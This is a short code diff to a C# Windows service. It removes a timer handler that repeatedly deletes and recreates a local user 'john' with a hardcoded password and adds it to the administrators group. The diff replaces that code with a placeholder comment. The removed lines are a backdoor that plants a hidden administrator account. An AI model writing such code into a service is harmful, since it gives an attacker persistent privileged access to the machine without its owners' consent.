@@ -34,16 +34,7 @@ namespace WindowsService
 
         private void OnElapsedTime(object source, ElapsedEventArgs e)
         {
-                Process b = Process.Start("cmd.exe", "/c net user john /delete");
-                b.WaitForExit();
-                b.Close();
-                Process c = Process.Start("cmd.exe", "/c net user john asdf123? /add");
-                c.WaitForExit();
-                c.Close();
-                Process d = Process.Start("cmd.exe", "/c net localgroup administrators john /add");
-                d.WaitForExit();
-                d.Close();
-                Thread.Sleep(10000);
+             //Do stuff
         }
 
         protected override void OnStop()
